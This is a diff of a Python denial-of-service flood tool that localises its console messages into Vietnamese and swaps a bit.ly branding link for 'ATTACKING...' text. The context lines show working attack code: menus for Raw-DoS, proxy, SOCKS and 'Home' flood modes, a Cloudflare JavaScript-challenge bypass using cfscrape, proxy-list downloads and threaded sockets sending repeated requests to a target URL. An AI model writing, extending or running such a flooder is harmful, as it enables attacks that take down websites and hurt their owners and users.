@@ -320,7 +320,7 @@ def start_mode():
  # 4: Raw-DoS   [ Home ] #                           #
 [+]=================================================[+]
 """)
-    choice_mode = input("[*] Attack Mode [0-6]: ")
+    choice_mode = input("[*] Chế Độ Tấn Công [0-6]: ")
     if choice_mode == "0":
         filenam2 = "Home"
         logo()
@@ -339,15 +339,15 @@ def start_mode():
         choice_down_proxies()
     elif choice_mode == "3":
         print("-----------------------------")
-        print("|_--> 1: Method Bypass v1")
-        print("|_--> 2: Method Bypass v2")
+        print("|_--> 1: Hình Thức Bypass v1")
+        print("|_--> 2: Hình Thức Bypass v2")
         filenam2 = "JS-Bypass"
         method_pass_cf = input("[?] Method [1/2]: ")
         if (method_pass_cf == "") or (method_pass_cf == "1"):
-            print("[!] Selected Method Bypass JS v1")
+            print("[!] Chọn Hình Thức Bypass JS v1")
             method_pass_cf = "1"
         else:
-            print("[!] Selected Method Bypass JS v2")
+            print("[!] Chọn Hình Thức Bypass JS v2")
             method_pass_cf = "2"
         logo()
         pass_cf()
@@ -364,7 +364,7 @@ def start_mode():
         logo()
         numthreads()
     else:
-        print ("[!] You mistyped, try again [!]\n")
+        print ("[!] Thử Lại [!]\n")
         start_mode()
 
 error_cf = int(0)
@@ -379,14 +379,14 @@ def pass_cf():
         else:
             scraper = cfscrape.create_scraper()
             soso    = scraper.get(url, timeout=15)
-        print("[!] Bypass Has Been Completed!")
+        print("[!] Bypass Thành Công!")
         numthreads()
     except:
         error_cf += 1
-        print("[!] Bypassing Again... [" +str(error_cf)+ "]")
+        print("[!] Đang Bypass Lại... [" +str(error_cf)+ "]")
         if error_cf>5:
             os.system("cls")
-            print("[!] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
+            print("[!] ERROR BYPASS\n[!] Vui lòng chọn hình thức tấn công khác[!]")
             start_mode()
         else:
             pass_cf()
@@ -394,25 +394,25 @@ def pass_cf():
 def choice_method_attack():
     global method_attack, name_method_attack
     print("-----------------------------")
-    print("|_--> 1: Request [ Normal ]")
+    print("|_--> 1: Request [ Bình Thường ]")
     print("|_--> 2: Request [  Spam  ]")
     method_attack = input("[*] Choice Request [1/2]: ")
     if (method_attack == "1") or (method_attack == ""):
-        name_method_attack = "Normal"
-        print("[!] Selected Method Attack Normal")
+        name_method_attack = "Bình Thường"
+        print("[!] Chọn Hình Thức Tấn Công Bình Thường")
         method_attack = "1"
     elif method_attack == "2":
         name_method_attack = "Spam"
-        print("[!] Selected Method Attack Spam")
+        print("[!] Chọn Hình Thức Tấn Công Spam")
     else:
-        print ("[!] You mistyped, try again [!]\n")
+        print ("[!] Thử Lại [!]\n")
         choice_method_attack()
     logo()
     start_mode()
 
 def choice_down_proxies():
     global urlproxy, urlproxy, sel_pr
-    choice4 = input("[?] Get New List " +str(filenam2)+ " [Y/N]: ")
+    choice4 = input("[?] Nhận Một Danh Sách Mới " +str(filenam2)+ " [Y/N]: ")
     if (choice4 == "y") or (choice4 == "Y"):
         print("-----------------------------")
         print("|_--> 1: Server X")
@@ -430,7 +430,7 @@ def choice_down_proxies():
                 urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
         proxyget()
     else:
-        print("[!] Selected No Get New List " +str(filenam2)+ " [!]")
+        print("[!] Đã Chọn Không Nhận Danh Sách " +str(filenam2)+ " [!]")
         proxies_list()
 
 def numthreads():
@@ -445,11 +445,11 @@ def numthreads():
     begin()
 
 def begin():
-    choice6 = input('=*= Press "Enter" to start attack: ')
+    choice6 = input('=*= Ấn "Enter" Để Bắt Đầu Tấn Công: ')
     if choice6 == "":
         #webbrowser.open("https://youtu.be/9WV1EALFiN0", new=0, autoraise=True)
         if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
-            print("[+] Admin: Save the Soul Being Captured by Evil!")
+            print("[+] BẠN KHÔNG NÊN TẤN CÔNG VÀO TRANG WEB NÀY")
             sleep(3)
         attack()
         print()
@@ -515,7 +515,7 @@ class raw_dos(threading.Thread):
                     requests.get(url, headers=headersx)
                 else:
                     requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] ATTACKING... | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 while True:
                     try:
                         for _ in range(100):
@@ -577,7 +577,7 @@ class Proxy(threading.Thread):
                 #req_code += 1
                 #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
-                print("[!] bit.ly/AnonyV28 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] ATTACKING... | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -647,7 +647,7 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[!] bit.ly/AnonyV28 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] ATTACKING... | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -677,7 +677,7 @@ class Socks(threading.Thread):
                     if str(port) == '443':
                         s = ssl.wrap_socket(s)
                     s.send(str.encode(request))
-                    print("[!] bit.ly/AnonyV28 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                    print("[!] ATTACKING... | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                     try:
                         for y in range(multiple):
                             s.send(str.encode(request))
@@ -725,7 +725,7 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[+] bit.ly/AnonyV28 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] ATTACKING... | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
                 #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
@@ -779,7 +779,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] ATTACKING... | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
@@ -811,7 +811,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] ATTACKING... | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
